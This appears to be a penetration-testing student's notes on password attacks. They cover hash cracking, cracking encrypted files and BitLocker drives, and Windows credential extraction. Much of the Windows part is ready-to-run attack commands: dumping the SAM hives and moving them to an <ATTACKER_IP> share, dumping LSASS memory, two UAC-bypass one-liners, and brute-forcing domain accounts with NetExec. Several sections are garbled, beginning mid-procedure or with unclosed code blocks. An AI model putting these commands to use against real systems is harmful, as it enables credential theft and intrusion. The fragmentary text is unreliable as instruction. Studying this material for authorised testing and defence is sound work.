<summary><h1>üí° Introduction</h1></summary>

Passwords are commonly hashed when stored, in order to provide some protection in the event they fall into the hands of an attacker.

Hash functions are cryptographically designed to be one-way operations, making it computationally infeasible to derive the original input from its hashed output. When malicious actors attempt to reverse this process, it constitutes password cracking. Common methodologies include:

1. Rainbow Table Attacks

    * Leveraging precomputed hash chains for rapid lookups

2. Dictionary Attacks

    * Testing known wordlists and common password variations

3. Brute-Force Attacks

    * Systematic trial of all possible character combinations (typically last-resort)

<summary><h2>Rainbow Tables</h2></summary>

Rainbow tables represent extensive pre-generated databases that map plaintext inputs to their corresponding hash outputs for specific cryptographic algorithms. These tables enable rapid password recovery through direct hash lookup.

> Because rainbow tables are such a powerful attack, salting is used.

</details>

<details>
<summary><h2>Salt</h2></summary>

A salt, in cryptographic terms, is a random sequence of bytes added to a password before it is hashed.

For example, if the salt *PWN0M1C0N_* is prepended to the same password, the MD5 hash would now be as follows:

```bash
echo -n PWN0M1C0N_password123! | md5sum

# ded0e91215d34046aca709995c794045
```

**Why use a Salt?**

* Prevents Identical Hashes: Without a salt, the same password always produces the same hash. Salts ensure uniqueness, even if two users have the same password.

* Defeats Rainbow Tables: Precomputed hash tables (rainbow tables) become useless because each salt requires a separate lookup table.

**How Salts Break Rainbow Tables**

A 1-byte salt (256 possible values) forces attackers to generate 256 versions of every precomputed hash. A rainbow table with 15 billion entries would need 3.84 trillion entries (15B √ó 256) to cover all salt combinations.
Modern Systems use larger salts (e.g., 16+ bytes), making rainbow tables computationally infeasible.

</details>

<details>
<summary><h2>Dictionary attack</h2></summary>

Dictionary attacks (or wordlist attacks) represent one of the most effective password cracking methods, particularly valuable for time-constrained engagements like penetration testing.

**Key Characteristics**

* **High Efficiency:** Targets common passwords first, maximizing success rate per attempt

* **Time Optimization:** Critical for engagements with limited testing windows

* **Customization:** Wordlists can be tailored to specific industries, regions, or targets

**Common Wordlist Resources**

* [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt): Contains millions of real passwords from historical breaches

* [SecLists](https://github.com/danielmiessler/SecLists): Comprehensive security testing collection including:

    * Common credentials

    * Default passwords

    * Pattern-based variations

<summary><h2>Writing Custom Wordlists and Rules</h2></summary>

Many users create their passwords based on simplicity rather than security.

Most people tend to follow predictable patterns when creating passwords. They often:

- Use words related to the service or platform (e.g., including the company's name for work-related accounts).
- Incorporate personal interests or elements from daily life.
- Choose passwords no longer than ten characters (according to statistics provided by [WP Engine](https://wpengine.com/resources/passwords-unmasked-infographic/)).

Common sources of inspiration include:

- **Pets** ‚Äì names like "fluffy123" or "rex_the_dog"
- **Friends or Family** ‚Äì nicknames or birth years
- **Sports** ‚Äì favorite teams, player numbers, or sports terminology
- **Hobbies** ‚Äì gaming aliases, instruments, or favorite books
- **Pop culture** ‚Äì movie titles, characters, or song lyrics

Even basic OSINT (Open Source Intelligence) techniques can uncover this kind of personal information, which can be leveraged to guess or crack passwords effectively.

Commonly, users use the following additions for their password to fit the most common password policies:

| **Description**                         | **Password Syntax**     |
|----------------------------------------|--------------------------|
| First letter is uppercase              | `Password`               |
| Adding numbers                         | `Password123`            |
| Adding year                            | `Password2022`           |
| Adding month                           | `Password02`             |
| Last character is an exclamation mark  | `Password2022!`          |
| Adding special characters              | `P@ssw0rd2022!`          |

<summary><h3>Generating Wordlists using Hashcat</h3></summary>

We can use Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. Hashcat uses a specific syntax to define characters, words, and their transformations.

Each rule is written on a new line and determines how a given word should be transformed.

```bash
cat custom.rule

# :
# c
# so0
# c so0
# sa@
# c sa@
# c sa@ so0
# $!
# $! c
# $! so0
# $! sa@
# $! c so0
# $! c sa@
# $! so0 sa@
# $! c so0 sa@
```

We can use the following command to apply the rules in custom.rule to each word in password.list and store the mutated results in mut_password.list.

```bash
hashcat --force password_list.txt -r custom.rule --stdout | sort -u > custom_password_list.txt
```

In this case, each word will produce fifteen mutated variants.

```bash
cat custom_password_list.txt

# password
# Password
# passw0rd
# Passw0rd
# p@ssword
# P@ssword
# P@ssw0rd
# password!
# Password!
# passw0rd!
# p@ssword!
# Passw0rd!
# P@ssword!
# p@ssw0rd!
# P@ssw0rd!
```

<summary><h2>Cracking Protected Files</h2></summary>

Attempting to crack password-protected documents is often worthwhile, as they may contain sensitive information that can be leveraged to gain further access.

JtR has many different scripts for extracting hashes from files. We can find these scripts on our system using the following command:

```bash
locate *2john*
```

Besides standalone files, we will often run across archives and compressed files‚Äîsuch as ZIP files‚Äîwhich are protected with a password.

There are many types of [compressed files](https://fileinfo.com/filetypes/compressed). Some of the more commonly encountered file extensions include `tar`, `gz`, `rar`, `zip`, `vmdb/vmx`, `cpt`, `truecrypt`, `bitlocker`, `kdbx`, `deb`, `7z`, and `gzip`.

It is possible to extract all the extensions in a list using the following command:

```bash
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

While many archive formats natively support password protection (e.g., ZIP, RAR), others like TAR require external encryption tools. Common solutions include `openssl` or `gpg`.

ssh2john.py SSH.private > ssh.hash
```

2. Then use JtR to try and crack it

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

3. We can then view the resulting hash

```bash
john ssh.hash --show
```

<summary><h3>Cracking OpenSSL encrypted GZIP files</h3></summary>

1. To determine if a GZIP file is encrypted, we can use the following command:

```bash
file compressed_files.gzip 

# compressed_files.gzip.gzip: openssl enc'd data with salted password
```

2. To systematically attempt decryption of the file using a wordlist, execute the following one-liner:

```bash
for i in $(cat /usr/share/wordlists/rockyou.txt);do openssl enc -aes-256-cbc -d -in <FILE> -k $i 2>/dev/null| tar xz;done
```

3. You may encounter multiple GZIP decompression warnings or errors:

```bash
# ...

# gzip: stdin: not in gzip format
# tar: Child returned status 1
# tar: Error is not recoverable: exiting now

# ...
```

Once the for loop has finished, we can check the current directory for a newly extracted file.

<summary><h3>Cracking BitLocker-encrypted drives</h3></summary>

[BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/#device-encryption) is a full-disk encryption feature developed by Microsoft for the Windows operating system.

John the Ripper (JtR) includes a utility called **bitlocker2john**, which extracts [four distinct hash types](https://openwall.info/wiki/john/OpenCL-BitLocker) from BitLocker-encrypted drives: two password-based hashes for user authentication and two recovery key hashes for backup access. We will focus on cracking the password using the first hash.

1. Extract the hashes

```bash
bitlocker2john -i backup.vhd > backup_hashes.txt
```

2. Filter the line that contains the BitLocker hash

```bash
grep "bitlocker\$0" backup_hashes.txt > backup_hash.txt
```

3. Then use JtR or Hahcat to try and crack it

**Hashcat**

```bash
hashcat -a 0 -m 22100 '<BITLOCKER_HASH>' /usr/share/wordlists/rockyou.txt
```

**John**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash.txt
```

<summary><h4>Mounting BitLocker-encrypted drives in Windows</h4></summary>

The easiest method for mounting a BitLocker-encrypted virtual drive on Windows is to double-click the .vhd file. Since it is encrypted, Windows will initially show an error. After mounting, simply double-click the BitLocker volume to be prompted for the password.

</details>

<details>
<summary><h4>Mounting BitLocker-encrypted drives in Linux (or macOS)</h4></summary>

To do this, we can use a tool called [dislocker](https://github.com/Aorimn/dislocker).

1. Install the tool

```bash
sudo apt-get install dislocker
```

2. Create two folders which we will use to mount the VHD

```bash
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
```

3. Use losetup to configure the VHD as loop device

```bash
sudo losetup -f -P backup.vhd
```

4. List the devices

```bash
sudo losetup -l
```

5. List the partitions of the device

```bash
sudo fdisk -l /dev/loop0
```

6. Decrypt the drive using dislocker

```bash
sudo dislocker /dev/loop0p1 -u<PASSWORD> -- /media/bitlocker
```

7. Mount the decrypted volume

```bash
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

8. If everything was done correctly, we can now browse the files:

```bash
cd /media/bitlockermount/
ls -la
```

<summary><h3>SSH</h3></summary>

<!-- Secure Shell (SSH) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The protocol implements three cryptographic primitives:

1. Symmetric Encryption

    * Uses shared secret keys (AES-256, ChaCha20, etc.) for session encryption

    * Implements Ephemeral Diffie-Hellman for secure key exchange

    * Key characteristics:

        * 128-512 bit keys (configurable)

        * Encrypts all subsequent communications

        * Common ciphers: AES-GCM, Blowfish, 3DES (deprecated)

2. Asymmetric Encryption

    * Leverages key pairs (RSA/ECDSA/Ed25519) for:

        * Host authentication

        * Key exchange initialization

    * Critical security considerations

        * Private keys should always be passphrase-protected

        * Default key locations (`~/.ssh/id_rsa`) are common attack targets

3. Hashing (HMAC)

    * Verifies message integrity via SHA-2/SHA-3 algorithms

    * Prevents replay attacks and tampering -->

We can use a tool like **Hydra** to brute force SSH. This is covered in-depth in the [LOGIN BRUTE FORCING](./13-login-brute-forcing.md) module.

<summary><h3>Password spraying</h3></summary>

Password spraying is a credential-based attack where a single password is tested against multiple user accounts before moving to the next password. 

This technique:

* Avoids account lockouts by spacing attempts

* Exploits weak organizational password policies

* Targets default/initial passwords (e.g., CompanyName123, Welcome1)

High-risk scenarios:

* Default credentials in onboarding processes  

* Password reuse across departments  

* Lack of multi-factor authentication (MFA)

<summary><h3>Default credentials</h3></summary>

Network infrastructure devices and enterprise software frequently ship with factory-set credentials, creating critical exposure when left unmodified during deployment.

While several lists of known default credentials are available online, there are also dedicated tools that automate the process. One widely used example is the [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet).

Install

```bash
pip3 install defaultcreds-cheat-sheet

Once installed, we can use the creds command to search for known default credentials associated with a specific product or vendor.

```bash
creds search <KEYWORD>
```

Example:

```bash
creds search linksys --export

<summary><h1>ü™ü Extracting Passwords from Windows Systems</h1></summary>

<details>
<summary><h2>Attacking SAM, SYSTEM, and AUTHORITY</h2></summary>

With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline. Performing this process offline allows us to continue our attacks without having to maintain an active session with the target.

<details>
<summary><h3>Registry Hives</h3></summary>

There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes.

| Registry Hive   | Description |
|----------------|-------------|
| `HKLM\SAM`     | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords. |
| `HKLM\SYSTEM`  | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes. |
| `HKLM\SECURITY`| Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |

</details>

1. **Use reg.exe to save copies of the registry hives *(requires launching cmd.exe with administrative privileges)***

    **Target Machine:** Save the contents of the HKLM\SAM registry hive to a file named 'sam.save'

    ```cmd
    reg.exe save hklm\sam %USERPROFILE%\Desktop\sam.save
    ```

    **Target Machine:** Save the contents of the HKLM\SYSTEM registry hive to a file named 'system.save'

    ```cmd
    reg.exe save hklm\system %USERPROFILE%\Desktop\system.save
    ```

    **Target Machine:** Save the contents of the HKLM\SECURITY registry hive to a file named 'security.save'

    ```cmd
    reg.exe save hklm\security %USERPROFILE%\Desktop\security.save
    ```

    After saving the registry hives offline, we can transfer them to our attack host using several methods. In this example, we'll use Impacket's smbserver along with basic CMD commands to copy the hive files to a shared folder hosted on the attacker machine.

2. Transfer the files from the target machine to the attack machine

    **Attack Machine:** Create a share with smbserver

    ```bash
    mkdir ~/winhives
    sudo smbserver.py -smb2support share ~/winhives
    ```

    **Target Machine:** Transfer the hive copies to the share

    ```bash
    C:\> move sam.save \\<ATTACKER_IP>\share
    ```

    ```bash
    C:\> move security.save \\<ATTACKER_IP>\share
    ```

    ```bash
    C:\> move system.save \\<ATTACKER_IP>\share
    ```

3. **Dump the hashes with secretsdump**

    **Attack Machine:** Run [`secretsdump.py`](../scripts/passwords/secretsdump.py) with Python and specify each of the hive files we retrieved from the target host.

    ```bash
    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
    ```

    Notice the following line:

    ```bash
    # Dumping local SAM hashes (uid:rid:lmhash:nthash)
    ```

    This tells us how to interpret the output and which hashes we can attempt to crack. 
    
    With this in mind, we can extract the NT hashes for each user account into a text file and begin the password cracking process. Keeping track of which hash belongs to which user is helpful for organizing and interpreting the results.

    > **NOTE:** The first step secretsdump performs is retrieving the system bootkey, which is required to decrypt the local SAM hashes. This is because the bootkey is used to encrypt and decrypt the SAM database. Without access to it, the hashes cannot be decrypted‚Äîmaking it essential to have copies of the relevant registry hives, as previously discussed.

4. **Crack the hashes with Hashcat**

    **Attack Machine:** Populate a text file with the NT hashes we were able to dump

    ```bash
    cat windowshashes.txt

    31d6cfe0d16ae931b73c59d7e0c089c0
    c02478537b9727d391bc80011c2e2321
    58a478135a93ac3bf058a5ea0e8fdb71
    ```

    **Attack Machine:** Run Hashcat against NT hashes

    ```bash
    sudo hashcat -m 1000 windowshashes.txt /usr/share/wordlists/rockyou.txt
    ```

    Obtaining these passwords can be valuable in several ways. For instance, the cracked credentials might allow us to access other systems on the network‚Äîespecially since password reuse across different work or personal accounts is common. Understanding and applying this technique is particularly useful during assessments and can be leveraged whenever we compromise a vulnerable Windows system and obtain administrative privileges to dump the SAM database.

<details>
<summary><h3>DCC2 hashes</h3></summary>

As previously mentioned, `HKLM\SECURITY` contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed representations of network credentials. 

**Example hash**

```
exampledomain.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

**Run Hashcat against NT hashes**

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

* Cache credentials locally in memory
* Create [access tokens](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
* Enforce security policies
* Write to Windows' [security log](https://learn.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

Before extracting credentials from LSASS, it's wise to first create a memory dump of the LSASS process. This allows us to analyze its contents offline from our attack host. Performing the attack offline provides greater flexibility‚Äîenabling faster processing and reducing the time spent on the target system, which helps minimize detection risk.

<details>
<summary><h4>Dumping LSASS process memory</h4></summary>

<details>
<summary><h5>Task Manager method</h5></summary>

With access to an interactive graphical session on the target, we can use task manager to create a memory dump. This requires us to:

1. Open Task Manager
2. Select the Processes tab
3. Find and right click the Local Security Authority Process
4. Select Create dump file
5. A file called `lsass.DMP` is created and saved in `%temp%`.

This is the file we will transfer to our attack host. 

</details>

<details>
<summary><h5>Rundll32.exe & Comsvcs.dll method</h5></summary>

The Task Manager method for dumping LSASS memory requires a GUI-based interactive session with the target, which isn't always available. As an alternative, we can use the command-line utility `rundll32.exe` to dump LSASS memory.

> **NOTE:** Modern antivirus solutions typically flag this technique as malicious activity.

Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:

**Finding LSASS's PID in cmd**

```cmd
tasklist /svc
```

Expected output

```cmd
Image Name                     PID Services
========================= ======== ============================================
...
lsass.exe                      672 KeyIso, SamSs, VaultSvc
...
```

**Finding LSASS's PID in PowerShell**

```powershell
Get-Process lsass
```

Expected output

```cmd
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

**Creating a dump file using PowerShell *(with an elevated PowerShell session)***

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). 

If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack host to attempt to extract any credentials that may have been stored in LSASS process memory.

</details>

</details>

<details>
<summary><h4>Using Pypykatz to extract credentials</h4></summary>

Once the dump file is transferred to our attack host, we can use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials directly from the .dmp file.

**Install**

```bash
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
sudo python3 setup.py install
```

At the time of writing, Mimikatz only runs on Windows systems. This means we‚Äôd either need a Windows-based attack host or run Mimikatz directly on the target‚Äîan approach that carries greater risk. In contrast, pypykatz offers a more convenient and stealthy alternative, as it can be run offline on a Linux-based attack host using just a copy of the dump file.

When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present.

**Running Pypykatz**

```bash
pypykatz lsa minidump ./lsass.DMP
```

**Output**

MSV

```bash
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

[MSV](https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that the Local Security Authority (LSA) uses to validate logon attempts against the SAM database. In this case, pypykatz extracted details from the `bob` user account's logon session stored in LSASS memory‚Äîincluding the SID, username, domain, and both the NT and SHA1 password hashes.

WDIGEST

```bash
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

WDIGEST is an older authentication protocol that was enabled by default in Windows XP through Windows 8, as well as Windows Server 2003 through 2012. When enabled, LSASS caches WDIGEST credentials in **clear-text**, meaning that if we target a system with WDIGEST active, there's a high chance of retrieving a plaintext password. However, in modern Windows versions, WDIGEST is **disabled by default** to mitigate this risk.

Kerberos

```bash
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by **Active Directory** in Windows domain environments. When a domain user authenticates, they are issued tickets that allow access to authorized network resources without re-entering credentials. LSASS stores Kerberos-related data such as passwords, encryption keys (ekeys), tickets, and PINs in memory. This makes it possible to extract these artifacts from LSASS and use them to access other systems within the same domain.

DPAPI

```bash
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

Mimikatz and pypykatz can extract DPAPI master keys for logged-on users whose data resides in LSASS process memory. These master keys can then be used to decrypt secrets stored by various applications that rely on DPAPI, potentially revealing credentials for multiple accounts. DPAPI attack techniques are explored in greater depth in the [WINDOWS PRIVILEGE ESCALATION](./23-windows-privilege-escalation.md) module.

**Cracking the NT Hash with Hashcat**

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

<summary><h2>Attacking Windows Credential Manager</h2></summary>

Introduced in Windows 7/Server 2008 R2, Credential Manager serves as a proprietary vault for storing authentication details (domain, web, and application credentials) in encrypted form. While Microsoft's internal workings remain undocumented, research reveals credentials are stored in protected locations:

* `%UserProfile%\AppData\Local\Microsoft\Vault\`
* `%UserProfile%\AppData\Local\Microsoft\Credentials\`
* `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
* `%ProgramData%\Microsoft\Vault\`
* `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

Each vault folder contains a Policy.vpol file with AES keys (AES-128 or AES-256) that is protected by DPAPI. These AES keys are used to encrypt the credentials. Newer versions of Windows make use of Credential Guard to further protect the DPAPI master keys by storing them in secured memory enclaves ([Virtualization-based Security](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)).

<details>
<summary><h3>Windows Vault and Credential Manager</h3></summary>

Microsoft often refers to the protected credential stores as Credential Lockers (previously known as Windows Vaults). While Credential Manager serves as the user-facing interface and API, the actual credentials are stored in encrypted vault or locker folders on the system.The following table lists the two types of credentials Windows stores:

| Name                | Description |
|---------------------|-------------|
| **Web Credentials** | Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge. |
| **Windows Credentials** | Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories. |

**Exporting credentials**

It is possible to export Windows Vaults to .crd files either via Control Panel or with the following command:

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

</details>

<details>
<summary><h3>Enumerating credentials with cmdkey</h3></summary>

We can use [cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) to enumerate the credentials stored in the current user's profile:

If you're using xFreeRDP, you can share [Mimikatz](https://github.com/ParrotSec/mimikatz/tree/master) with the remote system by mounting a local folder as a shared drive:

```bash
xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASSWORD> /drive:share,/home/<USER>/mimikatz
```

> This command maps the local /home/<USER>/mimikatz directory to a drive named share on the remote desktop session, allowing easy access to the Mimikatz binaries from within the RDP environment.

1. **Verify the current user**

```cmd
whoami
```

2. **Enumerate the credentials**

```cmd
cmdkey /list
```

Expected output

Currently stored credentials:

```cmd
Target: WindowsLive:target=virtualapp/didlogical
Type: Generic
User: 02hejubrtyqjrkfi
Local machine persistence

Target: Domain:interactive=SRV01\herman
Type: Domain Password
User: SRV01\herman
```

Stored credentials are listed with the following format:

| Key          | Value Description |
|--------------|-------------------|
| **Target**   | The resource or account name the credential is for. This could be a computer, domain name, or a special identifier. |
| **Type**     | The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons. |
| **User**     | The user account associated with the credential. |
| **Persistence** | Indicates whether a credential is saved persistently on the computer. Credentials marked with `Local machine` persistence survive reboots. |

3. **Use runas to impersonate the stored user like so**

```cmd
runas /savecred /user:SRV01\herman cmd
```

4. **UAC Bypass Techniques**

Option 1: FodHelper Exploit

```cmd
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
```

Option 2: ComputerDefaults Exploit 

```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```

5. **Navigating to Administrator Profile**

```cmd
cd C:\Users\Administrator
```

6. **Clear registry modifications post-exploitation**

```cmd
reg delete HKCU\Software\Classes\ms-settings /f
```

<summary><h2>Attacking Active Directory and NTDS.dit</h2></summary>

Active Directory (AD) serves as the foundational directory service in over 90% of enterprise Windows environments, managing identity, access, and policy across networked systems.

In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.

<details>
<summary><h3>Dictionary attacks against AD accounts using NetExec</h3></summary>

When a dictionary attack is appropriate, tailoring it to the target organization can improve results. Searching social media and the company‚Äôs website for employee directories can help identify staff names. Since most employees receive a username early on‚Äîand many organizations follow common naming conventions‚Äîthis information can guide our attack.

> **NOTE:** Conducting these attacks over the network can be quite noisy and easy to detect, as they often generate significant network traffic and trigger alerts on the target system. Additionally, repeated login attempts may be blocked due to Group Policy restrictions, such as account lockout policies.

Here are a few typical patterns to consider:


| **Username Convention**           | **Practical Example for Jane‚ÄØJill‚ÄØDoe** |
| --------------------------------- | --------------------------------------- |
| firstinitiallastname              | jdoe                                    |
| firstinitialmiddleinitiallastname | jjdoe                                   |
| firstnamelastname                 | janedoe                                 |
| firstname.lastname                | jane.doe                                |
| lastname.firstname                | doe.jane                                |
| nickname                          | doedoehacksstuff                        |

Often, an email address's structure will give us the employee's username (structure: username@domain). For example, from the email address jdoe@domain.com, we can infer that jdoe is the username.

<details>
<summary><h4>Advice: OSINT-Driven Username Enumeration Techniques</h4></summary>

A common tactic for discovering corporate username formats involves leveraging publicly available information through strategic searches:

1. **Email Discovery via Search Engines**

Querying `@exampledomain.com` on Google often reveals valid email formats from:

* Employee directories
* Press releases
* Conference attendee lists
* GitHub commits (if corporate emails are exposed)

2. **Social Media Scraping**

Tools like LinkedIn Scraper or theHarvester can correlate names/roles with email patterns.

3. **Document Metadata Analysis**

Search `site:exampledomain.com filetype:pdf` to find:

* Author fields in PDF properties (often contains internal usernames)
* Watermarks in internal docs

</details>

<details>
<summary><h4>Creating a custom list of usernames</h4></summary>

After gathering employee names from OSINT research (e.g., LinkedIn, company websites), create a formatted username list for spraying attacks. For this demonstration, we‚Äôll use a small sample set:

* Ben Williamson  
* Bob Burgerstien  
* Jim Stevenson  
* Jill Johnson  
* Jane Doe  

We can create a custom list using an automated list generator such as [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.

**Install**

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
chmod +x username-anarchy
```

**Usage**

```bash
./username-anarchy -i /home/names.txt
```

> While automated tools accelerate list generation, investing time in identifying an organization‚Äôs exact username convention significantly improves attack success rates.

</details>

<details>
<summary><h4>Enumerating valid usernames with Kerbrute</h4></summary>

Before initiating password-based attacks, verifying username validity prevents wasted effort on non-existent accounts. Kerbrute streamlines this process.

**Install**

```bash
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute
sudo mv kerbrute /usr/local/bin/
```

**Usage**

```bash
kerbrute userenum --dc <DC IP> --domain exampledomain.local /home/names.txt
```

Example output

```bash
# ...
# 2025/04/25 09:17:10 >  Using KDC(s):
# 2025/04/25 09:17:10 >   <DC IP>:<PORT>

# 2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@exampledomain.local
# ...
```

</details>

<details>
<summary><h4>Launching a brute-force attack with NetExec</h4></summary>

Once we've identified the naming convention and gathered employee names or prepared a username list, we can launch a brute-force attack against the target Domain Controller using a tool like NetExec. By leveraging the SMB protocol, we can send logon attempts directly to the DC. 

**Usage**

```bash
netexec smb <DC IP> -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

Example output

```bash
# SMB         <DC IP>     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
# SMB         <DC IP>     445    DC01             [+] exampledomain.local\bwilliamson:P@55w0rd! 
```

In this example, NetExec uses SMB to attempt a login as user bwilliamson (-u) with a password list (-p) of common passwords located at `/usr/share/wordlists/fasttrack.txt`. Be aware that if an account lockout policy is in place, this attack could lock the targeted account.

> **NOTE:** Understanding what artifacts an attack leaves behind is key to providing impactful remediation advice. On any Windows system, administrators can use Event Viewer to review Security logs and examine recorded actions. This insight can guide the implementation of stronger security controls and support post-breach investigations.

Once credentials are obtained, we can attempt to gain remote access to the Domain Controller and extract the NTDS.dit file, which contains password hashes for all domain users.
